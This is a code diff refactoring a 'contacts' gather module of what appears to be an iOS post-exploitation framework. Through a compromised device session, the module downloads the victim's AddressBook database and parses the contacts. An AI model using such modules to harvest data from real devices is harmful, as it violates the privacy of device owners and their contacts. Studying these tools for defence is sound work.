@@ -7,14 +7,12 @@ from seashell.lib.loot import Loot
 
 from pex.db import DB
 
-from hatsploit.lib.command import Command
+from badges.cmd import Command
 
 
-class HatSploitCommand(Command):
+class ExternalCommand(Command, DB):
     def __init__(self):
-        super().__init__()
-
-        self.details = {
+        super().__init__({
             'Category': "gather",
             'Name': "contacts",
             'Authors': [
@@ -23,14 +21,12 @@ class HatSploitCommand(Command):
             'Description': "View device contacts.",
             'Usage': "contacts",
             'MinArgs': 0
-        }
-
-        self.db = DB()
+        })
 
         self.db_file = '/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb'
         self.wal_file = '/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb-wal'
 
-    def run(self, argc, argv):
+    def run(self, _):
         if not self.session.download(
                 self.db_file, Loot().specific_loot('AddressBook.sqlitedb')):
             return
@@ -42,7 +38,7 @@ class HatSploitCommand(Command):
         self.print_process("Parsing contacts database...")
 
         try:
-            contacts = self.db.parse_addressbook(
+            contacts = self.parse_addressbook(
                 Loot().specific_loot('AddressBook.sqlitedb'))
         except Exception:
             self.print_error("Failed to parse contacts database!")
